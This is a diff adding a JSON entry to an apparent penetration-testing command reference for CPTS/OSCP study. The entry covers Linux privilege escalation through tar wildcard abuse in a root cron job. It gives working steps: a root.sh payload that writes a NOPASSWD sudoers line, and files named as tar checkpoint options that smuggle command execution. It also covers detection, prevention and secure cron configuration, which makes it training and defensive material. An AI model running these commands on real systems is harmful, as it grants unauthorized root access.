@@ -1,0 +1,98 @@
+{
+  "type": "command",
+  "platform": "linux",
+  "requires": [
+    "local-access"
+  ],
+  "protocols": [],
+  "tools": [
+    "tar"
+  ],
+  "tags": [
+    "wildcard-abuse",
+    "tar",
+    "cron"
+  ],
+  "category": "Privilege Escalation",
+  "subcategory": "Linux - Path & Wildcard Abuse",
+  "certifications": [
+    "CPTS",
+    "OSCP"
+  ],
+  "primary_cert": "CPTS",
+  "source": "CPTS Module 25: Linux Privilege Escalation",
+  "examples": [
+    {
+      "label": "Drop the payload script and checkpoint-action filenames",
+      "command": "echo 'echo \"htb-student ALL=(root) NOPASSWD: ALL\" >> /etc/sudoers' > root.sh"
+    }
+  ],
+  "notes": "A root cron running `tar ... *` in a writable dir treats attacker-named files as tar flags. Filenames --checkpoint=1 and --checkpoint-action=exec=sh root.sh make tar execute your script as root.",
+  "references": [
+    {
+      "title": "tar man page",
+      "url": "http://man7.org/linux/man-pages/man1/tar.1.html"
+    },
+    {
+      "title": "HTB Academy - Linux Privilege Escalation",
+      "url": "https://academy.hackthebox.com/module/details/51"
+    },
+    {
+      "title": "OffSec PEN-200 - Privilege Escalation",
+      "url": "https://www.offsec.com/courses/pen-200/"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "cron-abuse-pspy",
+      "note": "Confirm the root cron with pspy first.",
+      "rel": "prereq"
+    },
+    {
+      "id": "linux-enum-world-writable",
+      "note": "Find the writable dir the cron operates on.",
+      "rel": "prereq"
+    }
+  ],
+  "id": "wildcard-abuse-tar",
+  "name": "Wildcard Abuse - tar checkpoint (root cron)",
+  "command": "echo 'echo \"<user> ALL=(root) NOPASSWD: ALL\" >> /etc/sudoers' > root.sh",
+  "description": "A root cron job running `tar ... *` in a writable dir treats attacker-named files as tar options. Plant files named as --checkpoint flags so tar executes your script as root.",
+  "steps": [
+    {
+      "label": "1. Confirm the vulnerable job",
+      "command": "# e.g. */01 * * * * cd /home/htb-student && tar -zcf /home/htb-student/backup.tar.gz *\nman tar   # see --checkpoint / --checkpoint-action"
+    },
+    {
+      "label": "2. Plant payload + option-named files",
+      "command": "echo 'echo \"htb-student ALL=(root) NOPASSWD: ALL\" >> /etc/sudoers' > root.sh\necho \"\" > \"--checkpoint-action=exec=sh root.sh\"\necho \"\" > --checkpoint=1\nls -la"
+    },
+    {
+      "label": "3. Wait for cron, then confirm",
+      "command": "sudo -l"
+    }
+  ],
+  "opsec": "loud",
+  "mitre": [
+    "T1053.003",
+    "T1548"
+  ],
+  "exam": "exam-ok",
+  "defense": {
+    "why_it_works": "When tar is called with a wildcard (*) argument, the shell expands the wildcard to all matching filenames. Specially named files like '--checkpoint=1' and '--checkpoint-action=exec=sh root.sh' are expanded as tar command-line arguments, triggering tar's checkpoint action to execute the payload as the user running tar (root in a cron job).",
+    "prerequisites": "A cron job or script runs 'tar ... *' in an attacker-writable directory. Attacker can create files in that directory. Root executes the tar command with the wildcard.",
+    "impact": "Arbitrary command execution as root when the cron job fires. Can be used to add sudoers entries, create SUID shells, or install reverse shells.",
+    "detection": "Files named '--checkpoint=1' or '--checkpoint-action=exec=...' appearing in monitored directories. Cron job execution spawning unexpected child processes. File integrity monitoring alert on checkpoint-named files.",
+    "artifacts": "File system: files named --checkpoint* in cron-processed directory | Auditd: tar spawning unexpected child process | /etc/sudoers modified by cron",
+    "prevention": "Always quote wildcard arguments or use absolute glob patterns in cron scripts instead of bare *. Use --no-wildcards-match-slash in tar where applicable. Ensure cron-processed directories are not writable by untrusted users. Run tar with -- to terminate option parsing: 'tar -cf backup.tgz -- *' (partially mitigates).",
+    "misconfiguration": "Root cron job runs: cd /home/user && tar -zcf backup.tgz * with the target directory writable by the attacker user.",
+    "vulnerable_config": "# Vulnerable cron job\n*/01 * * * * root cd /home/htb-student && tar -zcf backup.tar.gz *\n\n# Attacker creates:\n# --checkpoint=1\n# --checkpoint-action=exec=sh root.sh\n# root.sh adds htb-student to sudoers",
+    "secure_config": "# Use explicit file list instead of wildcard\n*/01 * * * * root tar -zcf /backups/backup.tar.gz /var/www/html/\n\n# If wildcard needed, restrict directory permissions\nchown root:root /home/htb-student/\nchmod 755 /home/htb-student/\n\n# Or use find | tar instead\nfind /home/htb-student/ -maxdepth 1 -type f | tar -czf backup.tar.gz --files-from=-",
+    "evasion": "Create checkpoint files silently. The malicious filenames are invisible in normal directory listings unless user is aware of the technique.",
+    "sources": [
+      "HTB M25",
+      "MITRE T1053.003",
+      "MITRE T1574"
+    ]
+  }
+}
